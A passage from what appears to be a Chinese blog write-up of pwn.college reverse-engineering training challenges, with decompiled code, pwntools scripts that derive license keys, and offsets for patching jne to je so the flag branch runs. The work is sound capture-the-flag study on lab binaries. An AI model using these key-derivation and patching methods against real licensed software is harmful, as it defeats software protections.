&#125;</span><br><span class="line"><span class="comment">// reverse</span></span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">17</span>; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *((_BYTE *)&amp;buf + m);</span><br><span class="line">    *((_BYTE *)&amp;buf + m) = *((_BYTE *)&amp;buf + <span class="number">36</span> - m);</span><br><span class="line">    *((_BYTE *)&amp;buf + <span class="number">36</span> - m) = v5;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// xor</span></span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">36</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( n % <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x5Cu</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0xA3u</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0xBDu</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x29u</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        *((_BYTE *)&amp;buf + n) ^= <span class="number">0x6Cu</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x79</span>, <span class="number">0</span>x76, <span class="number">0</span>x8c, <span class="number">0</span>xe8, <span class="number">0</span>x55, <span class="number">0</span>x8e, <span class="number">0</span>x93, <span class="number">0</span>x75, <span class="number">0</span>x0b, <span class="number">0</span>xbc, <span class="number">0</span>x64, <span class="number">0</span>x69, <span class="number">0</span>x9b, <span class="number">0</span>xe8, <span class="number">0</span>x5d, <span class="number">0</span>x97, <span class="number">0</span>x9d, <span class="number">0</span>x77, <span class="number">0</span>x10, <span class="number">0</span>xb2, <span class="number">0</span>x7b, <span class="number">0</span>x6e, <span class="number">0</span>x9b, <span class="number">0</span>xe9, <span class="number">0</span>x4b, <span class="number">0</span>x93, <span class="number">0</span>x87, <span class="number">0</span>x6b, <span class="number">0</span>x13, <span class="number">0</span>xbd, <span class="number">0</span>x75, <span class="number">0</span>x60, <span class="number">0</span>x9b, <span class="number">0</span>xf9, <span class="number">0</span>x53, <span class="number">0</span>x8f, <span class="number">0</span>x93</span><br></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+buf+<span class="number">3</span>]		# <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + buf + <span class="number">3</span>]</span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_4C], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+var_28+<span class="number">4</span>]	# <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + buf + <span class="number">6</span>]	</span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_4B], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_4B]</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+buf+<span class="number">3</span>], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_4C]</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+var_28+<span class="number">4</span>], <span class="built_in">al</span>		# 交换<span class="number">3</span>和<span class="number">6</span></span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_40], <span class="number">0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+var_20+<span class="number">6</span>]		# 等价为 <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + buf + <span class="number">16</span>]</span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_4E], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+var_10]			# 等价为 <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> + buf + <span class="number">20</span>]</span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_4D], <span class="built_in">al</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_4D]</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+var_20+<span class="number">6</span>], <span class="built_in">al</span>			# 交换<span class="number">16</span>和<span class="number">20</span></span><br><span class="line"><span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_4E]</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+var_10], <span class="built_in">al</span></span><br></pre></td></tr></table></figure>

<p>动态调试：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原始输入：</span><br><span class="line">xwwtngaurrlkodniozqnvoyennptjlxvqeyqm		<span class="number">22</span> ---- <span class="number">32</span></span><br><span class="line">第一个： <span class="number">0x5ee6a471a571</span> (断点地址)</span><br><span class="line">xwwtngaurrlkodniozqnvoqennptjlxvyeyqm</span><br><span class="line">第二个： <span class="number">0x5ee6a471a5de</span></span><br><span class="line">xwwtngaurrlkodniozqnvoqennptjlxvyeyqm</span><br><span class="line"></span><br><span class="line">xwwtngaurrlkodniozqnvoyennptjlevqxyqm</span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">xwwtngaurrlkodniozqnvoyennptjlevqxyqm</span>		<span class="number">3</span> ---- <span class="number">12</span></span><br><span class="line"><span class="attribute">xwwtngaurrlkodniozqnvoqennptjlevyxyqm</span></span><br><span class="line"><span class="attribute">mqyxyveljtpnneqovnqzoindoklrruagntwwx</span></span><br><span class="line"><span class="attribute">mqynyveljtpnxeqovnqzoindoklrruagntwwx</span></span><br></pre></td></tr></table></figure>

<p>调试过程中，发现两个swap的具体交换位置。然后写exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/challenge/babyrev_level8.1&quot;</span>)</span><br><span class="line"></span><br><span class="line">hex_string=[<span class="number">0x79</span>, <span class="number">0x76</span>, <span class="number">0x8c</span>, <span class="number">0xe8</span>, <span class="number">0x55</span>, <span class="number">0x8e</span>, <span class="number">0x93</span>, <span class="number">0x75</span>, <span class="number">0x0b</span>, <span class="number">0xbc</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x9b</span>, <span class="number">0xe8</span>, <span class="number">0x5d</span>, <span class="number">0x97</span>, <span class="number">0x9d</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0xb2</span>, <span class="number">0x7b</span>, <span class="number">0x6e</span>, <span class="number">0x9b</span>, <span class="number">0xe9</span>, <span class="number">0x4b</span>, <span class="number">0x93</span>, <span class="number">0x87</span>, <span class="number">0x6b</span>, <span class="number">0x13</span>, <span class="number">0xbd</span>, <span class="number">0x75</span>, <span class="number">0x60</span>, <span class="number">0x9b</span>, <span class="number">0xf9</span>, <span class="number">0x53</span>, <span class="number">0x8f</span>, <span class="number">0x93</span>]</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(hex_string))</span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x5c</span></span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">5</span> == <span class="number">1</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xa3</span></span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">5</span> == <span class="number">2</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xbd</span></span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">5</span> == <span class="number">3</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x29</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x6c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0xa4</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hex_string[i] ^= <span class="number">0x48</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">temp = hex_string[<span class="number">3</span>]</span><br><span class="line">hex_string[<span class="number">3</span>] = hex_string[<span class="number">12</span>]</span><br><span class="line">hex_string[<span class="number">12</span>] = temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    temp = hex_string[i]</span><br><span class="line">    hex_string[i] = hex_string[<span class="number">36</span> - i]</span><br><span class="line">    hex_string[<span class="number">36</span> - i] = temp</span><br><span class="line"></span><br><span class="line"><span class="comment"># swap</span></span><br><span class="line">temp = hex_string[<span class="number">22</span>]</span><br><span class="line">hex_string[<span class="number">22</span>] = hex_string[<span class="number">32</span>]</span><br><span class="line">hex_string[<span class="number">32</span>] = temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(hex_string)):</span><br><span class="line">    payload += <span class="built_in">chr</span>(hex_string[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">data = io.recvall()</span><br><span class="line"><span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h4><p>看源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v12 = ((<span class="type">unsigned</span> __int64)bin_padding &amp; <span class="number">0xFFFFFFFFFFFFF000L</span>L) - <span class="number">4096</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  v3 = v6++;</span><br><span class="line"><span class="keyword">while</span> ( !mprotect((<span class="type">void</span> *)((v3 &lt;&lt; <span class="number">12</span>) + v12), <span class="number">0x1000u</span>LL, <span class="number">7</span>) );</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Changing byte %d/5.\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Offset (hex) to change: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hx&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New value (hex): &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hhx&quot;</span>, &amp;v4);</span><br><span class="line">  *(_BYTE *)(v5 + v12) = v4;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The byte has been changed: *%p = %hhx.\n&quot;</span>, (<span class="type">const</span> <span class="type">void</span> *)(v12 + v5), v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>关于可执行文件的装载——页映射（理解上述源码的v12是什么）</p>
<p><strong>静态装载</strong>——程序执行时所需要的指令和数据必须在内存中才能够正常运行，最简单的办法就是将程序运行所需要的指令和数据全都装入内存中，这样程序就可以顺利运行，这就是最简单的静态装入的办法。</p>
<p>**问题：**很多情况下程序所需要的内存数量大于物理内存的数量。</p>
<p>根本的解决办法是<strong>添加物理内存</strong>。相对于磁盘来说，内存是昂贵的，因此人们想尽各种办法，<strong>希望能够不添加内存的情况下，让更多的程序运行起来，尽可能有效地利用内存。</strong></p>
<p>那么为了良好地解决这个问题，研究人员发现，程序运行时是有局部性原理的，所以，将程序最常用的部分驻留在内存中，而将一些不太常用的数据存放在磁盘里面，这就是动态装载的基本原理。<strong>动态装载的思想是程序用到哪个模块，就将哪个模块装入内存，如果不用就暂时不装入，存放在磁盘中。</strong></p>
<p><strong>页映射</strong>——页映射不是一下子就把程序所有的数据和指令都装入内存，而是将内存和所有磁盘中的数据和指令按照“页(Page)”为单位划分成若干个页，以后所有的装载和操作的单位就是页。<strong>硬件规定的页的大小</strong>由4096字节、8192字节、2MB、4MB等，最常见的Intel IA32处理器一般都是用4096字节。这题所使用到的分页也是4096字节为一页。</p>
<p>假设程序所有的指令和数据的总和为32KB，机器为32位有16KB的内存，每个页大小为4096字节。那么程序总共被分为8个页。可人为将它们编号P0~P7。很明显，16KB的内存无法同时将32KB的程序装入，那么将按照动态装入的原理来进行整个装入过程。如果程序刚开始执行时的入口地址在P0，这时装载管理器发现程序的P0不在内存中，于是将内存F0分配给P0，并且将P0的内容装入F0；运行一段时间以后，程序需要用到P5，于是装载管理器将P5装入F1；就这样，映射关系如下所示：</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20250304121108218.png" class="" title="image-20250304121108218">

<p>【来源：《程序员的自我修养》P156】</p>
</blockquote>
<p>可以知道，v12计算得出上一页的起始地址。一页为4096字节。</p>
<p>解题思路：看到了if memcmp分支的条件。在ida中查看。其是jne，并且根据查表：<a target="_blank" rel="noopener" href="http://unixwiz.net/techtips/x86-jumps.html">Intel x86 JUMP quick reference</a>，可知jne的opcode是75，我们将其改成74即可控制分支。</p>
<p>根据思路，我们需要修改jne的opcode，通过gdb调试一下能够知道偏移量为<code>0x27c1</code>。最后我们只需要修改该位置的opcode为74，即可拿到flag。</p>
<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9.1"></a>level9.1</h4><p>思路同上，偏移为<code>0x1789</code>，不过这题用gdb调试的时候，没有main这个符号。可以设置断点在<code>_start</code>处，然后一步步调试。到main处的时候，就能拿到main的地址。然后使用<code>disassemble 起始地址,终止地址</code>来查看这个地址区间的反汇编结果。然后就能查看jne指令的地址。最后算出偏移为0x1789，再修改opcode就行了。</p>
<h4 id="level10-0"><a href="#level10-0" class="headerlink" title="level10.0"></a>level10.0</h4><p>只能修改一个字节，但是够了。思路还是以上的思路。算出偏移地址为：<code>0x1F17</code></p>
<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10.1"></a>level10.1</h4><p><code>gdb</code>的<code>finish</code>命令能够帮助快速执行完当前函数，断点可以打在<code>memcmp</code>函数这儿。偏移量为<code>0x201e</code></p>
<h4 id="level11-0"><a href="#level11-0" class="headerlink" title="level11.0"></a>level11.0</h4><p>思路一致，只不过这时需要修改的是两个jne指令为jn指令，所以需要找到两个偏移量。还是按照前面题目的思路，找到的两个偏移量为：<code>0x2857</code>和<code>0x2ae9</code></p>
<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11.1"></a>level11.1</h4><p>还是老套路，这次没有符号了。依然可以gdb调试拿到偏移量：<code>0x197b+1</code>和<code>0x1a5a</code>。</p>
<p>为什么要+1？是因为通过ida pro打开源程序后，发现它是带符号的opcode，因此查阅后需要将<code>OF 85</code>改成<code>OF 84</code>，所以，需要+1修改后面那个字节的值。而后面那个偏移不需要+1因为它时不带符号的opcode。因此后面的偏移值改成74即可。</p>
<h4 id="level12-0"><a href="#level12-0" class="headerlink" title="level12.0"></a>level12.0</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">execute_program</span><span class="params">(_BYTE *a1)</span>		<span class="comment">// al指向一个全为0的char数组，长度为256字节。</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  _BOOL4 v4; <span class="comment">// [rsp+1Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [rsp+20h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  read(<span class="number">0</span>, a1 + <span class="number">67</span>, <span class="number">6uLL</span>);			 <span class="comment">// 接收用户输入的6个字节，从char[67]开始</span></span><br><span class="line">  a1[<span class="number">99</span>] = <span class="number">18</span>;</span><br><span class="line">  a1[<span class="number">100</span>] = <span class="number">-84</span>;</span><br><span class="line">  a1[<span class="number">101</span>] = <span class="number">-73</span>;</span><br><span class="line">  a1[<span class="number">102</span>] = <span class="number">-78</span>;</span><br><span class="line">  a1[<span class="number">103</span>] = <span class="number">-91</span>;</span><br><span class="line">  a1[<span class="number">104</span>] = <span class="number">26</span>;</span><br><span class="line">  v1 = <span class="built_in">memcmp</span>(a1 + <span class="number">99</span>, a1 + <span class="number">67</span>, <span class="number">6uLL</span>);</span><br><span class="line">  v4 = v1 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;INCORRECT!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CORRECT! Your flag: &quot;</span>);</span><br><span class="line">    v2 = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    v3 = read(v2, buf, <span class="number">0x64u</span>LL);</span><br><span class="line">    write(<span class="number">1</span>, buf, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(!v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将al数组&#x3D;[18, -84, -73, -78, -91, -26]使用python中的<code>struct.pack</code>打包成字节序，然后发送给目标程序就行了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyrev-level-12-0&#x27;</span>)</span><br><span class="line">al = [<span class="number">18</span>, -<span class="number">84</span>, -<span class="number">73</span>, -<span class="number">78</span>, -<span class="number">91</span>, <span class="number">26</span>]</span><br><span class="line"></span><br><span class="line">payload = struct.pack(<span class="string">&#x27;6b&#x27;</span>, *al)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>

<blockquote>
<p>struct.pack说明：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct.pack(fmt, v1, v2, ...)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>fmt</code>：格式字符串，指定如何将数据打包成二进制。格式字符串由字符组成，每个字符表示一种数据类型。</li>
<li><code>v1,v2,...</code>：要打包的数据，可以是整数、浮点数、字符串等。</li>
</ul>
<p>格式字符串<code>fmt</code>由字节顺序(<code>@,=,&lt;,&gt;,!</code>)和数据类型(<code>c,b,B,?,h,H,i,I,l,L,q,Q,f,d,s,p,x</code>)组成。其中字节顺序可选，<code>@</code>默认，使用本地字节顺序、大小和对齐方式。<code>=</code>使用本地字节序，标准大小，无对其。<code>&lt;</code>小端模式，<code>&gt;</code>大端模式，<code>!</code>网络字节序（大端模式）。后续的数据类型常见的有：</p>
<p><code>c</code>：字符；<code>b</code>：有符号字节；<code>B</code>：无符号字节；<code>h</code>：有符号短整型；<code>H</code>：无符号短整型；<code>i</code>：有符号整型；<code>I</code>：无符号整型；<code>s</code>：字符串，需要指定长度，例如<code>10s</code>表示10字节的字符串</p>
</blockquote>
<h4 id="level12-1"><a href="#level12-1" class="headerlink" title="level12.1"></a>level12.1</h4><p>同理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyrev-level-12-1&#x27;</span>)</span><br><span class="line">al = [<span class="number">61</span>,<span class="number">118</span>,-<span class="number">61</span>,-<span class="number">110</span>]</span><br><span class="line"></span><br><span class="line">payload = struct.pack(<span class="string">&#x27;4b&#x27;</span>, *al)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(p.readall())</span><br></pre></td></tr></table></figure>

<h4 id="level13-0"><a href="#level13-0" class="headerlink" title="level13.0"></a>level13.0</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[s] IMM <span class="keyword">b</span> = <span class="number">0x71</span></span><br><span class="line">[s] IMM c = <span class="number">0x1</span></span><br><span class="line">[s] IMM a = <span class="number">0xbd</span></span><br><span class="line">[s] <span class="keyword">STM</span> *<span class="keyword">b</span> = a				# <span class="built_in">a1</span>[<span class="number">0x71</span>] = <span class="number">0xbd</span></span><br><span class="line">[s] <span class="keyword">ADD</span> <span class="keyword">b</span> c</span><br><span class="line">[s] IMM a = <span class="number">0xb5</span></span><br><span class="line">[s] <span class="keyword">STM</span> *<span class="keyword">b</span> = a				# <span class="built_in">a1</span>[<span class="number">0x72</span>] = <span class="number">0xb5</span> </span><br><span class="line">[s] <span class="keyword">ADD</span> <span class="keyword">b</span> c</span><br><span class="line">[s] IMM a = <span class="number">0xd8</span></span><br><span class="line">[s] <span class="keyword">STM</span> *<span class="keyword">b</span> = a				# <span class="built_in">a1</span>[<span class="number">0x73</span>] = <span class="number">0xd8</span></span><br><span class="line">[s] <span class="keyword">ADD</span> <span class="keyword">b</span> c</span><br><span class="line">[s] IMM a = <span class="number">0xdc</span></span><br><span class="line">[s] <span class="keyword">STM</span> *<span class="keyword">b</span> = a				# <span class="built_in">a1</span>[<span class="number">0x74</span>] = <span class="number">0xdc</span></span><br><span class="line">[s] <span class="keyword">ADD</span> <span class="keyword">b</span> c</span><br><span class="line">[s] IMM a = <span class="number">0xbd</span></span><br><span class="line">[s] <span class="keyword">STM</span> *<span class="keyword">b</span> = a				# <span class="built_in">a1</span>[<span class="number">0x75</span>] = <span class="number">0xbd</span></span><br><span class="line">[s] <span class="keyword">ADD</span> <span class="keyword">b</span> c</span><br><span class="line">[s] IMM a = <span class="number">0x98</span></span><br><span class="line">[s] <span class="keyword">STM</span> *<span class="keyword">b</span> = a				# <span class="built_in">a1</span>[<span class="number">0x76</span>] = <span class="number">0x98</span></span><br><span class="line">[s] <span class="keyword">ADD</span> <span class="keyword">b</span> c</span><br></pre></td></tr></table></figure>

<p>可以看到是一系列寄存器&#x2F;立即数的操作。题目要求输入6个字节。 而上述正好是从<code>a1[113]</code>开始，写入了6个字节。因此，我们把这6个字节转换成字节序丢给它即可。</p>
